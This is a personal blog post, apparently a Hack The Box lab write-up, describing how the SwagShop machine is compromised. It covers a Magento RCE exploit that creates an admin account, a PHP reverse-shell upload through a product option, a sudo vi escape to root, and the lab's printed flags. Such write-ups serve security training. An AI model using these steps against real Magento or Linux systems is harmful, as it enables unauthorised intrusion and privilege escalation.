@@ -1,0 +1,188 @@
+<!doctype html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<title>Hackthebox Swagshop Walkthrough</title>
+	<link rel="stylesheet" href="/assets/css/styles.css">
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
+
+	<link href="sticky-footer.css" rel="stylesheet">
+	<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" />
+	<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Hackthebox Swagshop Walkthrough</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Hackthebox Swagshop Walkthrough" />
+<meta name="author" content="msameer234" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="+=================================================================+ SCANNING +=================================================================+ nmap 10.10.10.140 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http" />
+<meta property="og:description" content="+=================================================================+ SCANNING +=================================================================+ nmap 10.10.10.140 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http" />
+<link rel="canonical" href="http://localhost:4000/2019/10/09/HackTheBox-SwagShop-Walkthrough.html" />
+<meta property="og:url" content="http://localhost:4000/2019/10/09/HackTheBox-SwagShop-Walkthrough.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-10-09T00:00:00+05:30" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/2019/10/09/HackTheBox-SwagShop-Walkthrough.html","headline":"Hackthebox Swagshop Walkthrough","dateModified":"2019-10-09T00:00:00+05:30","datePublished":"2019-10-09T00:00:00+05:30","author":{"@type":"Person","name":"msameer234"},"description":"+=================================================================+ SCANNING +=================================================================+ nmap 10.10.10.140 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2019/10/09/HackTheBox-SwagShop-Walkthrough.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body style="background-color: black;">
+	<div class="container">
+		<nav class="navbar navbar-expand-lg navbar-light" style="background-color: black; border: solid 1px; border-color: green;">
+	<div style="font-weight: bold; "><a style="color: green;font-size: 30px;" class="navbar-brand" href="/" >&#991;&alpha;&Sigma;</a></div>
+	<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" style="border-color: green; border: 2">
+		<span style="color: green;"><b>>></b></span>
+	</button>
+
+	<div class="collapse navbar-collapse" id="navbarSupportedContent">
+		<ul class="navbar-nav mr-auto">
+			
+				
+				<li class="nav-item active" >
+				<a class="nav-link" href="/" style="color:green;" >
+					Home
+				</a>
+				</li>
+				
+				<li class="nav-item active" >
+				<a class="nav-link" href="/blog.html" style="color:green;" >
+					Blog
+				</a>
+				</li>
+				
+				<li class="nav-item active" >
+				<a class="nav-link" href="/Resume.pdf" style="color:green;" >
+					Resume
+				</a>
+				</li>
+				
+					
+		</ul>
+	</div>
+</nav>
+
+
+		<div class="jumbotron" style="background-color: black; text-align:center;">   
+			<h1 class="display-4"><img src="/profile.jpg" class="avatar" style="height: 40%; width: 40%; border-radius: 50%;" alt="Samir Ahmad Malik"></h1>
+		</div>
+		<div class="_body">
+<h1>Hackthebox Swagshop Walkthrough</h1>
+<p style="border-bottom: solid; border-color: green; color: white;">09 Oct 2019 - msameer234
+
+  
+    - <a href="/authors/msameer234.html">Samir Ahmad Malik</a>
+  
+</p>
+
+<p><br />
++=================================================================+<br />
+								SCANNING<br />
++=================================================================+<br />
+ nmap 10.10.10.140<br />
+	PORT   STATE SERVICE<br />
+	22/tcp open  ssh<br />
+	80/tcp open  http</p>
+
+<p>+=================================================================+<br />
+							  ENUMERATION<br />
++=================================================================+</p>
+
+<p>Wibsite hosted on port 80/http — SwagShop – Shoping Site<br />
+	Using Magento CMS — found it by wappalyzer.<br />
+	<br />
+	Found RCE of Magento: <br />
+		command used: searchsploit Magento<br />
+			Magento eCommerce - Remote Code Execution  <br />
+			/usr/share/exploitdb/exploits/xml/webapps/37977.py<br />
+	Copy the exploit and edit it, then set your target: <br />
+		e.g. target = “http://10.10.10.140/index.php/”<br />
+	and save it.<br />
+	<br />
+	Now execute it as:<br />
+		python exploit.py<br />
+		it creates an admin account with username “forme” and password “forme”:<br />
+		Now login at : http://10.10.10.140/index.php/admin –» Found this by Dirbuster<br />
+		I tried to upload php shell, but I couldn’t.<br />
+		Then I found a way to create a new product– added an option that asks user to upload a file with extension .php<br />
+	<br />
+	Now make an order of the created product and upload the file php-reverse-shell.<br />
+	And start multi-handler of uploaded shell on msfconsole<br />
+<br />
+	Here you can access your uploaded shell on server: <br />
+		http://10.10.10.140/media/custom_options/order/p/h/<br />
+		found media folder by dirbuster.. then did some search after uploading the shell..<br />
+		Set up listener and get the reverse_shell.<br />
+<br />
+	Now navigate to /home/haris/<br />
+<br />
+	there is user.txt fie which contains user flag: a448877277e82f05e5ddf9f90aefbac8<br />
+<br />
++=================================================================+<br />
+						   PRIVILEGE-ESCALATION<br />
++=================================================================+<br />
+<br />
+Type Command:<br />
+	sudo -l and hit enter<br />
+Output:<br />
+	Matching Defaults entries for www-data on swagshop:<br />
+    		env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin<br />
+<br />
+	User www-data may run the following commands on swagshop:<br />
+    		(root) NOPASSWD: /usr/bin/vi /var/www/html/*<br />
+<br />
+	<br />
+Here we found we can access all files from “/var/www/html/” directory and vi text editor from “/usr/bin/” directory with root privileges.<br />
+<br />
+lets create a tty first as it is not there:<br />
+python3 is installed:<br />
+the command is: <br />
+	python3 -c ‘import pty;pty.spawn(“/bin/sh”)’<br />
+<br />
+Now, lets edit any file from /var/www/html/ directory with vi using sudo:<br />
+<br />
+cd /home/haris<br />
+<br />
+sudo vi /var/www/html/../../../etc/sudoers<br />
+<br />
+Now to enter into Command Mode and execute the command /bin/sh type in    :!/bin/sh     and hit enter<br />
+<br />
+and we got root..<br />
+<br />
+Navigating to /root/ directory..<br />
+cd /root<br />
+cat root.txt<br />
+c2b087d66e14a652a3b86a130ac56721<br />
+<br />
+   <strong><em><br /> __</em>
+ /| |/|| |&lt;br /&gt;
+/<em>| ´ |.` |</em>\           We are open! (Almost)<br />
+  |   |.  |<br />
+  |   |.  |         Join the beta HTB Swag Store!<br />
+  |</strong>_|.__|       https://hackthebox.store/password<br />
+<br />
+                   PS: Use root flag as password!<br />
+<br />
+<br />
+<br />
+<br />
+And we got flag in root.txt file: c2b087d66e14a652a3b86a130ac56721<br />
+<br />
+Finish..!!!<br />
+<br />
+<br /><br /><br /></p>
+
+</div>
+
+		<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
+		<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
+	</div>
+<hr class="my-4">
+	<footer class="container footer mt-auto py-3" style="border: solid 1px; border-color: green; text-align: center;">
+		<div class="container">
+			<span class="text-muted">Copyright © 2019 <a href="msameer234.github.io">Samir Ahmad Malik</a> </span>
+		</div>
+		
+	</footer>
+</body>
+</html>
